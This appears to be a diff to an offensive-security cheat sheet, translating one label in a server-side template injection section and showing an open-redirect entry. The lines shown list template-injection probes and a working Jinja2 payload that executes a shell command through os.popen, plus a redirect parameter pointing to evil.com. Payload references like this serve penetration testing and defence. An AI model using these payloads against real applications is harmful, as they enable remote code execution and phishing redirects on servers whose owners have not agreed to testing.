@@ -286,7 +286,7 @@ TRADECRAFT: SSTI
 - Jinja2/Twig → {{7*7}} → 49
 - Freemarker → ${7*7} → 49
 - ERB → <%= 7*7 %> → 49
--沙盒逃逸 → {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+- sandbox escape → {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 
 TRADECRAFT: OPEN REDIRECT
 - Parameter manipulation → ?next=https://evil.com
